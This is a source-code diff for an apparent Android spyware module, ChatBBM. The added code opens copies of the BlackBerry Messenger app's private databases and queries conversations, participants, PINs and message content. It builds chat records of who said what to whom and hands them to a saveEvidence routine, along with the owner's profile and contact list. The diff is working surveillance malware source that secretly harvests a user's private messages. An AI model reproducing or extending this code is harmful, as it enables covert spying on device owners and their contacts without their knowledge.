@@ -1,10 +1,10 @@
 package com.android.dvci.module.chat;
 
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabaseCorruptException;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
+import com.android.dvci.db.RecordGroupsVisitor;
 import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.module.ModuleAddressBook;
 import com.android.dvci.util.Check;
@@ -13,6 +13,8 @@ import com.android.mm.M;
 import org.xml.sax.SAXException;
 
 import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Date;
 import java.util.concurrent.Semaphore;
 
 import javax.xml.parsers.ParserConfigurationException;
@@ -23,9 +25,9 @@ import javax.xml.parsers.ParserConfigurationException;
 public class ChatBBM extends SubModuleChat {
 
 
-	private static final int BBM_2_1 = 1;
-	private static final int BBM_2_4 = 0;
-	private int version = BBM_2_1;
+	private static final int BBM_v1 = 1;
+	private static final int BBM_v2 = 0;
+	private int version = BBM_v1;
 
 	public class Account {
 
@@ -39,7 +41,8 @@ public class ChatBBM extends SubModuleChat {
 	}
 
 	private static final String TAG = "ChatBBM";
-	private static final int PROGRAM = 0x0e; // anche per addressbook
+	private static final int PROGRAM = 0x05; // anche per addressbook
+
 	String pObserving = M.e("com.bbm");
 	String dbFileMaster = M.e("/data/data/com.bbm/files/bbmcore/master.db");
 	String dbFileGroup = M.e("/data/data/com.bbm/files/bbgroups/bbgroups.db");
@@ -73,7 +76,6 @@ public class ChatBBM extends SubModuleChat {
 		updateHistory();
 	}
 
-
 	private void updateHistory() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (updateHistory) ");
@@ -103,15 +105,8 @@ public class ChatBBM extends SubModuleChat {
 				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
 			}
 
-			long lastmessage = readBBMChatHistory(helper);
+			readBBMChatHistory(helper);
 
-			if (lastmessage > lastBBM) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (start) serialize: %d", lastmessage);
-				}
-				markup.serialize(lastmessage);
-				lastBBM = lastmessage;
-			}
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
@@ -146,7 +141,6 @@ public class ChatBBM extends SubModuleChat {
 				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
 			}
 
-
 			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);
 			if (helper == null) {
 				if (Cfg.DEBUG) {
@@ -159,23 +153,17 @@ public class ChatBBM extends SubModuleChat {
 				version = getBBMVersion(helper);
 				readLocalContact(helper);
 				readAddressContacts(helper);
-				long lastmessage = readBBMChatHistory(helper);
 
-				if (lastmessage > lastBBM) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (start) serialize: %d", lastmessage);
-					}
-					markup.serialize(lastmessage);
-					lastBBM = lastmessage;
-				}
+				readBBMChatHistory(helper);
+
 			} finally {
 				helper.disposeDb();
 			}
 			started = true;
 
 		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (start) Error: " + e);
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
 			}
 		} finally {
 			readChatSemaphore.release();
@@ -199,38 +187,136 @@ public class ChatBBM extends SubModuleChat {
 	}
 
 	private long readBBMChatHistory(GenericSqliteHelper helper) {
-		try {
-			long lastmessageS = readBBMConversationHistory(helper);
-			long lastmessageG = readBBMGroupHistory(helper);
+		long lastmessageS = readBBMConversationHistory(helper);
+		long lastmessageG = readBBMGroupHistory();
 
-			return Math.max(lastmessageS, lastmessageG);
-		} catch (SQLiteDatabaseCorruptException ex) {
-			enabled = false;
+		long lastmessage = Math.max(lastmessageS, lastmessageG);
+
+		if (lastmessage > lastBBM) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readBBMChatHistory) Error: ", ex);
+				Check.log(TAG + " (start) serialize: %d", lastmessage);
 			}
-			return 0;
-		} catch (Exception ex) {
+			markup.serialize(lastmessage);
+			lastBBM = lastmessage;
+		}
+
+		return lastmessage;
+	}
+
+	private long readBBMGroupHistory() {
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileGroup);
+		if (helper == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readBBMChatHistory) Error: ", ex);
+				Check.log(TAG + " (start) cannot open db");
 			}
 			return 0;
 		}
-	}
 
-	private long readBBMGroupHistory(GenericSqliteHelper helper) {
+		try {
+			// TODO
+
+		} finally {
+			helper.disposeDb();
+		}
+
 		return 0;
 	}
 
 	private long readBBMConversationHistory(GenericSqliteHelper helper) {
-		return 0;
+
+		String timestamp = Long.toString(this.lastBBM);
+		final ChatGroups groups = new ChatGroups();
+		RecordGroupsVisitor visitorGrp = new RecordGroupsVisitor(groups,"T.TIMESTAMP", true);
+		String[] sql = new String[]{"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P " +
+				"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
+				"JOIN USERS AS U ON U.USERID = P.USERID " +
+				"WHERE C.MESSAGETIMESTAMP > ?",
+				"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,S.PIN FROM PARTICIPANTS AS P " +
+						"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
+						"JOIN USERS AS U ON U.USERID = P.USERID " +
+						"JOIN USERPINS AS S ON U.USERID = S.USERID " +
+						"WHERE C.MESSAGETIMESTAMP > ?"
+				};
+
+		helper.traverseRawQuery(sql[version], new String[]{timestamp}, visitorGrp);
+		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
+
+		if(groups.getAllGroups().size()==0){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readBBMConversationHistory), No groups ");
+			}
+			return 0;
+		}
+
+		Contact me = groups.getContact("0");
+		if(me == null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readBBMConversationHistory), ERROR: cannot get contact 0");
+			}
+
+			return 0;
+		}
+		final String me_number =me.number;
+		final String me_name = me.name;
+
+		RecordVisitor visitorMsg = new RecordVisitor(null, null, "T.TIMESTAMP") {
+			@Override
+			public long cursor(Cursor cursor) {
+				String groupid = cursor.getString(0);
+				Long timestamp = cursor.getLong(1) * 1000;
+				Date date = new Date(timestamp);
+				String content = cursor.getString(2);
+				String userId = cursor.getString(3);
+
+				boolean incoming = !userId.equals("0");
+				Contact contact = groups.getContact(userId);
+
+				String peer_id = contact.number;
+				String peer = contact.name;
+
+				String from_id, from, to_id, to;
+				if(incoming){
+					from_id = peer_id;
+					from = peer;
+					to_id = groups.getGroupToName(from_id, groupid);
+					to = groups.getGroupToName(from_id, groupid);
+				}else{
+					from_id = me_number;
+					from = me_name;
+					to_id = groups.getGroupToName(from_id, groupid);
+					to = groups.getGroupToName(from_id, groupid);
+				}
+
+				MessageChat message = new MessageChat(PROGRAM, date, from_id, from, to_id, to, content, incoming);
+				messages.add(message);
+				return timestamp;
+			}
+		};
+
+		String sqlmsg ="SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID\n" +
+				"FROM TEXTMESSAGES AS T\n" +
+				"JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID\n" +
+				"JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID\n" +
+				"JOIN USERS AS U ON U.USERID = P.USERID\n" +
+				"WHERE T.TIMESTAMP>?\n" +
+				"AND C.CONVERSATIONID=?\n";
+
+		long maxid = 0;
+		for( String group: groups.getAllGroups() ){
+			long ret = helper.traverseRawQuery(sqlmsg, new String[]{timestamp, group}, visitorMsg);
+			maxid=Math.max(ret, maxid);
+		}
+
+		getModule().saveEvidence(messages);
+
+		return maxid;
 	}
 
 	private void readAddressContacts(GenericSqliteHelper helper) {
 
 		if (ModuleAddressBook.getInstance() != null) {
 			try {
-				if (version == BBM_2_1) {
+				if (version == BBM_v1) {
 					readAddressContactsUserPins(helper);
 				} else {
 					readAddressContactsUsers(helper);
@@ -253,7 +339,6 @@ public class ChatBBM extends SubModuleChat {
 
 	private void readAddressContactsUserPins(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
 
-
 		String sql = "SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId";
 		RecordVisitor visitor = new RecordVisitor() {
 			@Override
@@ -269,10 +354,7 @@ public class ChatBBM extends SubModuleChat {
 			}
 		};
 
-
 		helper.traverseRawQuery(sql, null, visitor);
-
-
 	}
 
 	private void readAddressContactsUsers(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
@@ -291,15 +373,14 @@ public class ChatBBM extends SubModuleChat {
 			}
 		};
 
-
 		helper.traverseRecords(M.e("Users"), visitor);
-
-
 	}
 
 	private void readLocalContact(GenericSqliteHelper helper) {
+
 		String sql = "SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId";
 		account = new Account();
+
 		RecordVisitor visitor = new RecordVisitor(null, null) {
 
 			@Override
